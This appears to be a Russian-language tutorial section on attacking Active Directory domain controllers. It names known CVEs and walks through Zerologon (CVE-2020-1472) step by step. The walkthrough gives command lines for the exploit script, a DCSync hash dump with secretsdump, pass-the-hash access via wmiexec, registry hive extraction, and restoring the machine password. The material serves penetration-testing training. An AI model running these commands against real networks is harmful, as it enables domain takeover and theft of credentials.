*************************** 14.2 Эксплуатация уязвимостей узла контроллера домена *********************

Эксплуатация уязвимостей узла контроллера домена

В серверных системах, которые могут быть настроены как контроллеры домена, а также в протоколах, использующихся контроллерами, появляются и становятся известными уязвимости, позволяющие взломать сервер и захватить на нем полное управление.

Это один из самых простых способов компрометировать и захватить управление над контроллером домена.

 14_2_1.png

    Примеры таких уязвимостей:

        PrinterNightmare
        ZeroLogon  https://habr.com/ru/company/bizone/blog/526168/
        SamAccountNameSpoofing  https://habr.com/ru/articles/594923/
        MS14-068  https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068
        Drop The MIC (Во взаимодействии DC с DC) и пр. вплоть до MS17-010


Zerologon

Рассмотрим эксплуатацию одной из самых ярких уязвимостей в контроллере домена.

Zerologon — это название уязвимости с идентификатором CVE-2020-1472. Ее так назвали из-за изъяна процесса Netlogon: вектор инициализации (IV), который должен был бы представлять собой случайное число, всегда состоит из одних нулей.

    -----> Полный разбор эксплойта представлен тут https://www.secura.com/uploads/whitepapers/Zerologon.pdf

Эксплуатация Zerologon

Шаги:

1. Сброс пароля при помощи эксплойта:  https://github.com/VoidSec/CVE-2020-1472

python3 cve-2020-1472-exploit.py -n 'DC01$' -t 10.10.0.1

2. Реализация атаки DCSync с пустым паролем:

python3 secretsdump.py -no-pass -just-dc 'domain.local/DC01$@10.10.0.1'

3. Получаем NT-хеш администратора с “относительным идентификатором” (relative identifier) RID 500 и используем его для получения доступа к управлению контроллером через WMI с помощью утилиты пакета Impacket: wmiexec.py:

python3 wmiexec.py -hashes <hash-value> 'domain.local/DC01$@10.10.0.1'

    После успешного изменения пароля DC сервер Active Directory работает некорректно. Чтобы DC продолжал нормально работать, необходимо переустановить исходный хэш пароля.

4. Создаем и скачиваем резервные копии реестра для восстановления пароля DC:
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
lget system.save
lget sam.save
lget security.save
del /f system.save
del /f sam.save
del /f security.save

5. Извлекаем пароль из извлеченных копий реестра:

python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

6. Получаем пароль машины контроллера домена в строке: 

$MACHINE.ACC:plain_password_hex:b4d1....

7. И инсталлируем хеш машины обратно:

python3 reinstall_original_pw.py DC-01$ 10.10.0.1 b4d1….
